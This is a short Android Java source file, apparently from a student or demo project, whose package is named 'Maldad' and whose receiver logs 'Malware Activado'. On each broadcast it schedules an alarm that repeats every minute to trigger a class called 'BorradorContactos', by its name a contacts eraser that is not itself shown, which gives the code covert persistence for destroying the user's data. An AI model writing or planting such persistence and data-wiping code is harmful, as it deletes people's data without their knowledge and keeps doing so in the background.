package com.example.jcruizg.comunicacioneshttp.Utilidad.Maldad;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;


import android.app.AlarmManager;
import android.app.PendingIntent;
import java.util.Calendar;

public class MiReceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        AlarmManager alarmMgr = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent recepIntent = new Intent(context, BorradorContactos.class);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, recepIntent, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmMgr.setInexactRepeating(AlarmManager.RTC_WAKEUP, Calendar.getInstance().getTimeInMillis(), 1000 * 60, alarmIntent);
        Log.d("Malware","Activado");
    }
}

